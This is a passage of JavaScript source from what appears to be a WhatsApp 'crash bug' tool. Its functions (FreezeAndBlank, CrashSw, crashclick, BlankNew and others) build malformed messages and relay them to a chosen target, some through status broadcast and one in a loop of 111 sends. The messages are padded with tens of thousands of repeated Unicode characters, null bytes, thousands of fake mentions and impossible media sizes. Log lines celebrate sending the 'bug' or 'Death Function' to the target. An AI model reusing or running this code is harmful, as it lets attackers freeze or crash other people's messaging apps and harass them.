          mimetype: "image/jpeg",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "99999999999999999",
          height: "9999999999999999",
          width: "9999999999999999",
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
          mediaKeyTimestamp: "172519628",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyEiIzFRMjNBYQBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
          streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
          caption: "ꦾ".repeat(20000) + "ꦾ".repeat(60000),
          contextInfo: {
            stanzaId: "Thumbnail.id",
            isForwarded: true,
            forwardingScore: 999,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
            ]
          }
        }
      }
    }
  }, {});

  const Payment_Info = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "Danz Kil You",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: "\u0000".repeat(1045000),
        version: 3
      }
    }
  }, {});

  await xincrash.relayMessage("status@broadcast", viewOnceMsg.message, {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });
  
  await xincrash.relayMessage("status@broadcast", Payment_Info.message, {
    messageId: Payment_Info.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });
}

async function FreezeAndBlank(xincrash, target) {
  const apa = "ꦾ".repeat(20000) + "ꦾ".repeat(60000);
  
  let buttons = [
    {
      name: "single_select",
      buttonParamsJson: "",
    },
  ];
  
  for(let i = 0; i < 15; i++) {
    buttons.push(
      {
        name: "cta_call",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(3000),
        }),
      },
      {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(3000),
        }),
      },
      {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(3000),
        }),
      }
    );
  }
  
  const timestamp = new Date();
  
  let bum = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: apa,
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
              fileLength: "999999999999",
              pageCount: 1316134911,
              mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
              fileName: "Tes!!" + "ꦾ".repeat(60000),
              fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
              directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
              mediaKeyTimestamp: timestamp.getTime(), // .getTime() untuk number
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioyQA34C//4AAwD/2Q==",
              streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
              thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
              thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
              thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
              artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
              artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
              artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
              artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
            },
            hasMediaAttachment: true,
          },
          body: { 
            text: apa,
          },
          nativeFlowMessage: {
            buttons: buttons,
            messageParamsJson: "[{".repeat(25000),
          },
          contextInfo: {
            stanzaId: Math.floor(Math.random() * 99999).toString(),
            isForwarded: true,
            forwardingScore: 999,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
            ],
            quotedMessage: {
              locationMessage: {
                degreesLatitude: 999999999,
                degreesLongitude: -999999999,
                name: '{'.repeat(15000),
                address: '{'.repeat(15000)
              }
            }
          }
        }
      }
    }
  }, { 
    timestamp: timestamp 
  });

  for(let i = 0; i < 111; i++) {
    let msg2 = generateWAMessageFromContent(target, {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "121212@newsletter",
            newsletterName: apa,
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxyP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73poLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioyQA34C//4AAwD/2Q==",
            caption: "Hola!!!",
            inviteExpiration: timestamp.getTime() + 9999999999999,
          },
          nativeFlowMessage: {
            buttons: buttons,
          },
          contextInfo: {
            remoteJid: "X",
            mentionedJid: ["121212@newsletter"],
            stanzaId: "ondet",
            businessMessageForwardInfo: {
              businessOwnerJid: "35546566@s.whatsapp.net"
            }
          }
        }
      }
    }, { 
      timestamp: new Date() 
    });
    
    await xincrash.relayMessage(target, msg2.message, { messageId: msg2.key.id });
  }
  
  await xincrash.relayMessage(target, bum.message, { messageId: bum.key.id });
}

function penambah() {
  const tletter = "ꦽ".repeat(5000) + "Curut".repeat(5000);
}

async function BlankNewsletterXSticker(xincrash, target) {
  await xincrash.relayMessage(target, {
    viewOnceMessage: {
       message: {
         newsletterAdminInviteMessage: {
          newsletterJid: "999999999@newsletter",
          newsletterName: "#About Danz" + "ꦽ".repeat(25000),
          jpegThumbnail: "",
          caption: "#Kenal Danz Ga!?" + "ꦽ".repeat(15000),
          inviteExpiration: Date.now() + 1814400000, 
           stickerMessage: {
             fileSha256: "A".repeat(1000),
             fileEncSha256: "B".repeat(1000),
             mediaKey: "C".repeat(1000),
             mimetype: "image/webp",
             height: 999999,
             width: 999999,
             fileLength: 999999,
             isAnimated: true,
             url: "A".repeat(10000),
             directPath: "B".repeat(10000),
             mediaKeyTimestamp: '1'.repeat(1000),
             stickerSentTs: Date.now(),
             contextInfo: {
               mentionedJid: [
                 ...Array.from({ length: 2000}, () => "1" + Math.floor(Math.random() *  999999) + "@s.whatsapp.net"
                ),
              ],
            },
          },
          body: {
            text: "DanzIsHere" + "ꦽ".repeat(25000) + "ꦽ".repeat(15000),
            hasMediaAttachment: true,
          },
          nativeFlowMessage: {
            messageParamsJson: "{[".repeat(10000),
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "catalog_message",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "review_order",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "send_location",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "mpm",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: penambah(),
                },
                {
                  name: "single_select",
                  buttonParamsJson: penambah(),
                },
              ],
            },
          },
        },
      },
    },
    {
      messageId: null,
      participant: { jid: target },
    }
  );
    
    console.log(chalk.green(`Succes Send BlankNewsletterXSticker To ${target}`));
  }
  
async function CrashSw(xincrash, target) {
    try {
        let msg1 = generateWAMessageFromContent(target, {
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc",
                mimetype: "video/mp4",
                fileSha256: "RLju7GEX/CvQPba1MHLMykH4QW3xcB4HzmpxC5vwDuc=",
                fileLength: "327833",
                seconds: 15,
                mediaKey: "3HFjGQl1F51NXuwZKRmP23kJQ0+QECSWLRB5pv2Hees=",
                caption: "./DanzOfficial⃠" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(30000),
                height: 1249989998989998,
                width: 709998989998884,
                fileEncSha256: "ly0NkunnbgKP/JkMnRdY5GuuUp29pzUpuU08GeI1dJI=",
                directPath: "/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc",
                mediaKeyTimestamp: "1748347294",
                contextInfo: {
                    isSampled: true,
                    mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`),
                    statusAttributionType: "SHARED_FROM_MENTION",
                },
                streamingSidecar: "GMJY/Ro5A3fK9TzHEVmR8rz+caw+K3N+AA9VxjyHCjSHNFnOS2Uye15WJHAhYwca/3HexxmGsZTm/Viz",
                thumbnailDirectPath: "/v/t62.36147-24/29290112_1221237759467076_3459200810305471513_n.enc",
                thumbnailSha256: "5KjSr0uwPNi+mGXuY+Aw+tipqByinZNa6Epm+TOFTDE=",
                thumbnailEncSha256: "2Mtk1p+xww0BfAdHOBDM9Wl4na2WVdNiZhBDDB6dx+E=",
                annotations: [{
                    embeddedContent: {
                        embeddedMusic: {
                            musicContentMediaId: "589608164114571",
                            songId: "870166291800508",
                            author: "ꦾ".repeat(20000),
                            title: "ꦾ".repeat(20000),
                            artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
                            artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                            artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
                            artistAttribution: "https://www.instagram.com/_u/xrelly",
                            countryBlocklist: true,
                            isExplicit: true,
                            artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
                        },
                    },
                    embeddedAction: true
                }]
            }
        }, {});

        let msg2 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                        mimetype: "image/webp",
                        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
                        fileLength: "999999999",
                        mediaKeyTimestamp: "1746112211",
                        firstFrameLength: 19904,
                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                        isAnimated: true,
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
                            groupMentions: [],
                            entryPointConversionSource: "non_contact",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 467593,
                        },
                        stickerSentTs: Date.now(),
                        isAvatar: true,
                        isAiSticker: true,
                        isLottie: true
                    }
                }
            }
        }, {});

        let msg3 = generateWAMessageFromContent(target, {
            scheduledCallCreationMessage: {
                callType: "2",
                scheduledTimestampMs: Date.now(),
                title: "ꦾ".repeat(30000)
            }
        }, {});

        await xincrash.relayMessage("status@broadcast", msg1.message, {
            messageId: msg1.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });

        await xincrash.relayMessage("status@broadcast", msg2.message, {
            messageId: msg2.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });

        await xincrash.relayMessage("status@broadcast", msg3.message, {
            messageId: msg3.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });

        console.log("✅ Successfully Sent the Bug to the Target.");
    } catch (error) {
        console.log("❌ Failed to Send Bug to Target");
    }
}

async function crashclick(target) {
 const msg1 = {
  newsletterAdminInvite: {
  newsletterId: "1@newsletter",
  newsletterName: "XINCRASH" + "ោ៝".repeat(25000),
  caption: "DanzIsHere" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(50000) + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(25000),
  inviteExpiration: "999999999",
  },
 };
 
 const msg2 = {
   groupInvite: {
     groupId: "333@g.us",
     groupName: "MURBUG BY DANZ" + "ោ៝".repeat(15000),
     caption: "Danz" + "ꦾ".repeat(20000) + "ꦽ".repeat(25000),
     inviteExpiration: "999999999",
   },
  };
 
 await xincrash.relayMessage(target, msg1, {
    participant: { jid: target },
    messageId: null,
  });

 await xincrash.relayMessage(target, msg2, {
    participant: { jid: target },
    messageId: null,
  });

 console.log(`Succes Send Bug To ${target} By Danz`);
}

async function BlankNew(xincrash, target) {
  await xincrash.relayMessage(target, {
    viewOnceMessage: {
      message: {
        extendedMessage: {
          body: {
            text: "DanzOfficial" + "ꦽ".repeat(25000) + "ꦽ".repeat(15000),
          },
           nativeFlowMessage: {
               buttons: [
                 {
                    name: "catalog_message",
                    buttonParamsJson: JSON.stringify({
                    caption: "Kuntul Lagi".repeat(5000),
                   }),
                 },
                 {
                    name: "send_location",
                    buttonParamsJson: JSON.stringify({
                    caption: "Kuntul Lagi".repeat(5000),
                   }),
                 },
                 {
                    name: "mpm",
                    buttonParamsJson: JSON.stringify({
                    caption: "Kuntul Lagi".repeat(5000),
                   }),
                 },
                 {
                    name: "review_order",
                    buttonParamsJson: JSON.stringify({
                    caption: "Kuntul Lagi".repeat(5000),
                   }),
                 },
                 {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({
                    caption: "Kuntul Lagi".repeat(5000),
                   }),
                 },
                 {
                    name: "cta_call",
                    buttonParamsJson: JSON.stringify({
                    caption: "Kuntul Lagi".repeat(5000),
                   }),
                 },
                 {
                     name: "review_and_pay",
                     buttonParamsJson: JSON.stringify({
                     caption: "Kuntul Lagi".repeat(5000),
                   }),
                },
             ],
           },
         },
       },
     },
   },
  {
    messageId: null,
    participant: { jid: target },
  }
);

  await xincrash.relayMessage(target, {
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "999999999@newsletter",
          newsletterName: "#ChanelDanz" + "ꦽ".repeat(35000),
          jpegThumbnail: "",
          caption: "#DanzIsHere" + "ꦽ".repeat(25000),
          inviteExpiration: Date.now() + 1814400000, 
        },
      },
    },
  },
  {
    messageId: null,
    participant: { jid: target },
  }
);

  console.log(chalk.red(`Succes Send Death Function To ${target}`));
}

async function DanzBlank3(target, Ptcp = true) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "X-INCRASH 🔥!⟆" + "ꦾ".repeat(40000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(40000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await xincrash.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }

async function DanzBlank2(target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "Masuk Bg Free Admin Buat Lu" + "ោ៝".repeat(20000),
      caption: "Danz Community" + "ោ៝".repeat(15000),
      inviteExpiration: "999999999"
    }
  };

  await xincrash.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}

async function inviss(xincrash, target) {
  const viewOnceMsg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "99999999999999999",
          height: "9999999999999999",
          width: "9999999999999999",
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
          mediaKeyTimestamp: "172519628",
